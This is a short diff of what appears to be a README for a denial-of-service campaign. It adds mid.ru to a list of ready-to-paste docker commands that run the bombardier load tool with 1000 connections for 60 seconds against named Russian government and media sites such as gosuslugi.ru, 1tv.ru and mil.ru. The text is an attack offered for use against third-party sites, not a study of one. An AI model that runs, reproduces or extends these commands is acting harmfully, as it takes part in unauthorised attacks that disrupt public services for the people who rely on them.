@@ -20,8 +20,8 @@ or easiest way
 `docker run -ti --rm alpine/bombardier -c 1000 -d 60s -l https://www.gosuslugi.ru`
 <br>
 `docker run -ti --rm alpine/bombardier -c 1000 -d 60s -l https://www.1tv.ru`
-
-
+<br>
+`docker run -ti --rm alpine/bombardier -c 1000 -d 60s -l https://mid.ru`
 <br>
 sites
 https://mil.ru
